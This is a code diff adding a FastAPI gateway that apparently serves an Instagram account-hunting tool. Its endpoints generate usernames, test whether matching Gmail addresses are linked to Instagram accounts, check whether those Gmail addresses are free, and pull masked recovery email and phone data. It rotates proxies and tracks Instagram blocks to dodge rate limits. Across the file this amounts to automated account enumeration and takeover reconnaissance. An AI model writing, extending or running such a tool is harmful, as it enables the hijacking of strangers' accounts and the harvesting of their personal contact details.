+async def _ensure_ig_gen_buffer(min_val: str):
+    min_val = str(min_val)
+    async with _ig_gen_lock:
+        tasks = _ig_gen_buffer_tasks.get(min_val) or []
+        # Back-compat: older value might be a single task
+        if not isinstance(tasks, list):
+            tasks = [tasks]
+        tasks = [t for t in tasks if t and not t.done()]
+        target = max(1, int(IG_GEN_BUFFER_FILL_WORKERS))
+        while len(tasks) < target:
+            tasks.append(asyncio.create_task(_ig_gen_buffer_loop(min_val)))
+        _ig_gen_buffer_tasks[min_val] = tasks
+
+
+async def _shutdown_ig_gen_service():
+    """Cancel buffer + inflight tasks so shutdown does not leave pending to_thread()."""
+    global _ig_gen_inflight, _ig_gen_inflight_min
+    pending = []
+    if _ig_gen_inflight and not _ig_gen_inflight.done():
+        pending.append(_ig_gen_inflight)
+    for task_list in list(_ig_gen_buffer_tasks.values()):
+        if isinstance(task_list, list):
+            pending.extend(t for t in task_list if t and not t.done())
+    pending.extend(t for t in _ig_gen_prefill_tasks if t and not t.done())
+    _ig_gen_prefill_tasks.clear()
+    for task in pending:
+        task.cancel()
+    if pending:
+        await asyncio.gather(*pending, return_exceptions=True)
+    _ig_gen_buffer_tasks.clear()
+    _ig_gen_inflight = None
+    _ig_gen_inflight_min = None
+    _ig_gen_executor.shutdown(wait=False, cancel_futures=True)
+
+
+async def _background_gateway_warm():
+    """Warm caches/buffers after server is already accepting /alive."""
+    loop = asyncio.get_running_loop()
+    try:
+        await loop.run_in_executor(_hunt_lookup_executor, _preload_hunt_lookup_caches)
+    except Exception:
+        pass
+    for part in IG_GEN_WARM_MINS:
+        part = str(part).strip()
+        if not part:
+            continue
+        try:
+            await _ensure_ig_gen_buffer(part)
+            prefill = asyncio.create_task(_ig_gen_prefill_buffer(part))
+            _ig_gen_prefill_tasks.append(prefill)
+        except Exception:
+            pass
+
+
+@asynccontextmanager
+async def _app_lifespan(_app):
+    loop = asyncio.get_running_loop()
+    loop.set_default_executor(_ig_gen_executor)
+    _refresh_alive_snapshot()
+    boot_task = asyncio.create_task(_background_gateway_warm())
+    alive_task = asyncio.create_task(_alive_refresh_loop())
+    yield
+    alive_task.cancel()
+    if not boot_task.done():
+        boot_task.cancel()
+        await asyncio.gather(boot_task, alive_task, return_exceptions=True)
+    await _shutdown_ig_gen_service()
+
+
+app = FastAPI(lifespan=_app_lifespan)
+
+
+# ---------------- API ----------------
+
+@app.get("/alive")
+async def alive():
+    with _alive_snapshot_lock:
+        snap = _alive_snapshot.get("payload")
+    if snap:
+        return snap
+    loop = asyncio.get_running_loop()
+    return await loop.run_in_executor(_alive_refresh_executor, _refresh_alive_snapshot)
+
+
+def _build_alive_payload():
+    buffer_depth = {}
+    for min_val, buf in _ig_gen_buffers.items():
+        try:
+            buffer_depth[str(min_val)] = buf.qsize()
+        except Exception:
+            buffer_depth[str(min_val)] = 0
+    pool = get_proxy_pool()
+    proxy_count = len(pool) if pool else 0
+    return {
+        "alive": True,
+        "service": "inpareto-gateway",
+        "port": API_PORT,
+        "ig_block_sec": round(_ig_block_seconds_left(), 1),
+        "vps_proxies": vps_proxy_enabled(),
+        "proxy_pool": proxy_count,
+        "speed": {
+            "profile": GATEWAY_PROFILE,
+            "termux": _IS_TERMUX,
+            "ig_gen_parallel": IG_GEN_PARALLEL_WORKERS,
+            "ig_gen_buffer": IG_GEN_BUFFER_SIZE,
+            "buffer_fill_workers": IG_GEN_BUFFER_FILL_WORKERS,
+            "buffer_low_water": IG_GEN_BUFFER_LOW_WATER,
+            "buffer_depth": buffer_depth,
+            "ig_thread_pool": IG_GEN_THREAD_POOL_SIZE,
+            "ig_http_pool": IG_HTTP_POOL_SIZE,
+            "uvicorn_workers": UVICORN_WORKERS,
+        },
+    }
+
+
+def _refresh_alive_snapshot():
+    payload = _build_alive_payload()
+    with _alive_snapshot_lock:
+        _alive_snapshot["payload"] = payload
+        _alive_snapshot["at"] = time.time()
+    return payload
+
+
+async def _alive_refresh_loop():
+    """Keep /alive instant — never scan buffers on the hot probe path."""
+    loop = asyncio.get_running_loop()
+    while True:
+        try:
+            await loop.run_in_executor(_alive_refresh_executor, _refresh_alive_snapshot)
+        except Exception:
+            pass
+        await asyncio.sleep(2.0)
+
+
+@app.get("/ig_profile")
+async def ig_profile(request: Request):
+    """Hit enrich: actual posts/name/pfp via web_profile_info (+ fallbacks)."""
+    username = request.query_params.get("username")
+    pk = request.query_params.get("pk")
+    if not username:
+        return JSONResponse({"error": "'username' parameter is required."}, status_code=403)
+    async with _profile_fetch_sem:
+        data = await asyncio.to_thread(fetch_user_profile, username, pk)
+    return data
+
+
+@app.get("/ig_gen")
+async def ig_gen(request: Request):
+    min_val = request.query_params.get("min")
+    if not min_val:
+        return JSONResponse({"error": "'min' parameter is required."}, status_code=403)
+    async with _ig_gen_serve_sem:
+        try:
+            status, username, info_data, response_text = await asyncio.wait_for(
+                _ig_gen_acquire(str(min_val)),
+                timeout=float(HUNT_GEN_BUDGET),
+            )
+        except asyncio.TimeoutError:
+            status, username, info_data, response_text = (
+                False, None, None, "gen_timeout",
+            )
+        except Exception as exc:
+            status, username, info_data, response_text = False, None, None, str(exc)[:200]
+        status, username, info_data, response_text = _ig_gen_result_tuple(
+            status, username, info_data, response_text,
+        )
+        return {
+            "status": status,
+            "username": username,
+            "response": response_text,
+            "info": info_data,
+        }
+
+
+@app.get("/hunt_cycle")
+async def hunt_cycle(request: Request):
+    """Single HTTP hop for joint workers: ig_gen + ig_lookup_m3 + gmail_lookup."""
+    min_val = request.query_params.get("min")
+    if not min_val:
+        return JSONResponse({"error": "'min' parameter is required."}, status_code=403)
+    meta = _hunt_cycle_meta(min_val)
+    try:
+        async with _ig_gen_serve_sem:
+            status, username, info_data, gen_msg = await asyncio.wait_for(
+                _ig_gen_acquire(str(min_val)),
+                timeout=float(HUNT_GEN_BUDGET),
+            )
+        status, username, info_data, gen_msg = _ig_gen_result_tuple(
+            status, username, info_data, gen_msg,
+        )
+    except asyncio.TimeoutError:
+        return {
+            "gen_ok": False,
+            "username": None,
+            "info": None,
+            "valid": False,
+            "hit": False,
+            "error": "gen_timeout",
+            **meta,
+        }
+    except Exception as exc:
+        return {
+            "gen_ok": False,
+            "username": None,
+            "info": None,
+            "valid": False,
+            "hit": False,
+            "error": str(exc)[:200],
+            **meta,
+        }
+    if not status or not username:
+        return {
+            "gen_ok": False,
+            "username": None,
+            "info": info_data,
+            "valid": False,
+            "hit": False,
+            "response": gen_msg,
+            **meta,
+        }
+    if len(str(username)) < 6:
+        return {
+            "gen_ok": True,
+            "username": username,
+            "info": info_data,
+            "valid": False,
+            "hit": False,
+            "response": gen_msg,
+            "skip": "username_too_short",
+            **meta,
+        }
+    email = f"{username}@gmail.com"
+    loop = asyncio.get_running_loop()
+    try:
+        async with _hunt_lookup_sem:
+            valid, hit, ig_msg, gmail_msg = await asyncio.wait_for(
+                loop.run_in_executor(
+                    _hunt_lookup_executor,
+                    _hunt_lookup_gmail_pair,
+                    email,
+                ),
+                timeout=float(HUNT_CYCLE_LOOKUP_BUDGET),
+            )
+    except asyncio.TimeoutError:
+        return {
+            "gen_ok": True,
+            "username": username,
+            "info": info_data,
+            "valid": False,
+            "hit": False,
+            "ig_response": "lookup_timeout",
+            "gmail_response": "lookup_timeout",
+            "gen_response": gen_msg,
+            "error": "lookup_timeout",
+            **_hunt_cycle_meta(min_val),
+        }
+    return {
+        "gen_ok": True,
+        "username": username,
+        "info": info_data,
+        "valid": valid,
+        "hit": hit,
+        "ig_response": ig_msg,
+        "gmail_response": gmail_msg,
+        "gen_response": gen_msg,
+        **_hunt_cycle_meta(min_val),
+    }
+
+
+@app.get("/ig_lookup_m1")
+async def api_check(request: Request):
+    email = request.query_params.get("email")
+    status, response_text = await asyncio.to_thread(ig_lookup_M1_hunt, email)
+    return {
+        "status": status,
+        "email": email,
+        "response": response_text,
+        "method": "bloks_ar_search",
+    }
+
+
+@app.get("/ig_lookup_m3")
+async def api_check_m3(request: Request):
+    email = request.query_params.get("email")
+    status, response_text = await asyncio.to_thread(ig_lookup_M3_hunt, email)
+    return {
+        "status": status,
+        "email": email,
+        "response": response_text,
+        "method": "mobile_check_email",
+    }
+
+
+@app.get("/ig_lookup_m2")
+async def api_check2(request: Request):
+    email = request.query_params.get("email")
+    status, response_text = await asyncio.to_thread(ig_lookup_M2, email)
+    return {
+        "status": status,
+        "email": email,
+        "response": response_text,
+    }
+
+
+@app.get("/ig_recovery")
+async def ig_recovery(request: Request):
+    """Hit enrich: masked email/phone — identical engine to api.py."""
+    username = (request.query_params.get("username") or "").strip().lstrip("@")
+    if not username:
+        return JSONResponse({"error": "'username' parameter is required."}, status_code=403)
+    ig_block_left = round(_ig_block_seconds_left(), 1)
+    loop = asyncio.get_running_loop()
+    async with _recovery_sem:
+        try:
+            result = await loop.run_in_executor(
+                _recovery_executor, _run_ig_recovery, username,
+            )
+        except Exception as exc:
+            return {
+                "ok": False,
+                "username": username,
+                "flow": "unknown",
+                "email": None,
+                "phone": None,
+                "error": "network_error",
+                "detail": str(exc)[:160],
+                "ig_block_sec": ig_block_left,
+            }
+    if isinstance(result, dict):
+        result["ig_block_sec"] = ig_block_left
+    return result
+
+
+@app.get("/gmail_lookup")
+async def api_gmail(request: Request):
+    email = request.query_params.get("email")
+    try:
+        task = await asyncio.to_thread(check_gmail, email)
+    except Exception as exc:
+        return {"status": False, "email": email, "response": str(exc)[:200]}
+    if isinstance(task, str):
+        return {"status": False, "email": email, "response": task}
+    status, response_text = task
+    return {
+        "status": status,
+        "email": email,
+        "response": response_text,
+    }
+
+
+def _port_in_use(port):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind(("0.0.0.0", port))
+        return False
+    except OSError:
+        return True
+
+
+def _uvicorn_log_level():
+    return "error" if _is_termux() else "critical"
+
+
+def main():
+    """
+    Start the gateway.
+
+    Important: uvicorn manages its own event loop. Do not call uvicorn.run()
+    from inside asyncio.run()/an already-running event loop.
+    """
+    suppress_server_logs()
+    if _port_in_use(API_PORT):
+        print()
+        print(apply_color("  ┌─ PORT IN USE ──────────────────────────────────────────────┐", ANSI_RED))
+        print(apply_color(f"  │  Port {API_PORT} is already taken on this device.          │", ANSI_RED))
+        print(apply_color("  │  Stop the other endpoint.py / uvicorn process first.       │", ANSI_RED))
+        print(apply_color("  └────────────────────────────────────────────────────────────┘", ANSI_RED))
+        print()
+        raise SystemExit(1)
+    device_hash = get_device_hash()
+    public_ip = asyncio.run(fetch_public_ip())
+    api_host = f"{public_ip}:{API_PORT}" if public_ip else f":{API_PORT}"
+    cloud_err = save_api_host_record(device_hash, public_ip or "", API_PORT, api_host)
+    render_startup_banner(device_hash, public_ip, API_PORT, cloud_err is None)
+    log_level = _uvicorn_log_level()
+    print(apply_color(f"  Listening on http://127.0.0.1:{API_PORT}  (log level: {log_level})\n", ANSI_DIM))
+    try:
+        uvicorn.run(
+            app,
+            host="0.0.0.0",
+            port=API_PORT,
+            log_level=log_level,
+            access_log=False,
+        )
+    except OSError as exc:
+        print(apply_color(f"\n  [ENDPOINT] Could not bind port {API_PORT}: {exc}\n", ANSI_RED))
+        raise SystemExit(1) from exc
+    print(apply_color("\n  [ENDPOINT] Server stopped unexpectedly (port closed).\n", ANSI_RED))
+    raise SystemExit(1)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        render_keyboard_exit()
+    except Exception as exc:
+        import traceback
+        print(apply_color("\n  [ENDPOINT ERROR]\n", ANSI_RED))
+        traceback.print_exc()
+        if _is_termux():
+            print(apply_color("  Termux fix: bash install-termux.sh\n", ANSI_CYAN))
+        else:
+            print(apply_color("  Fix: pip install -r requirements.txt\n", ANSI_DIM))
+        raise SystemExit(1) from exc
